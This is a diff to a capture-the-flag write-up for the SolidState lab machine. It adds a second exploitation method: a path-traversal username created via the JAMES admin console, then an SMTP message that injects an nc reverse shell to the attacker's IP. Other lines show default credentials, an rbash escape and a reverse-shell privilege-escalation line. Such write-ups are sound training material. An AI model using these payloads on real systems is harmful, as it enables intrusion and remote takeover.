@@ -18,7 +18,7 @@ Port 119: JAMES nntpd
 Port 4555: JAMES Remote Administration Tool 2.3.2
 ```
 
-+ Navigate to `http://10.10.10.51/`
++ Navigate to `http://10.10.10.51/` and always start off with enumerating HTTP first.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8873f868-18e3-4fe4-9b10-4cc631320a78)
 
@@ -42,6 +42,9 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c43603ab-f981-4e94-8d30-edf92e1effb1)
 
+## Exploitation
+
+### 1.Method:
 + Connect to port 4555 with `root`-`root` using nc: `nc 10.10.10.51 4555`
 + List commands: `HELP`
 + To list users: `listusers`
@@ -110,13 +113,45 @@ pass: P@55W0rd1!2@
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c8ded426-603e-4d03-860d-b2f9606647d5)
 
-+ mindy’s shell is rbash.
++ mindy’s shell is rbash(restricted bash shell).
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd5f965b-922d-4a3b-90eb-b4dcdf6c6319)
 
 + Add `-t bash` to the SSH connection command to escape: `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/507882d1-c29e-471e-b6fe-9320d168cd60)
+
+### 2.Method:
++ Log back to james remote admin server: `nc 10.10.10.51 4555`
++ Create a user with the username `../../../../../../../../etc/bash_completion.d` and password `123`.
+```
+nc 10.10.10.51 4555
+adduser ../../../../../../../../etc/bash_completion.d 123
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0dd154bd-55c6-4f9e-8d75-6e1e2628efe4)
+
++ Send this user an email that contains a reverse shell. The significant point here is to add **single quote** in the **MAIL FROM** field and after the **FROM** field. 
+```
+telnet 10.10.10.51 25
+EHLO test
+MAIL FROM: <'test@mail.com>
+RCPT TO: <../../../../../../../../etc/bash_completion.d>
+DATA
+```
+```
+FROM: test
+'
+/bin/nc -e /bin/bash 10.10.14.10 5555
+.
+```
+
++ Start listener on your kali attack machine: `nc -lnvp 5555`
++ Login ssh with `mindy`:`P@55W0rd1!2@` and wait 3 minutes until get the shell.
++ Get the shell without rbash shell!
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1ab9e6be-224e-4740-ae13-3695b6317f04)
+
 
 ## Privilege Escalation
 + Transfer [pspy](https://github.com/DominicBreuker/pspy) to the target.
@@ -148,3 +183,5 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
 # References & Alternatives:
 + https://vvmlist.github.io/#solidstate
 + https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/solidstate-writeup-w-o-metasploit
++ 
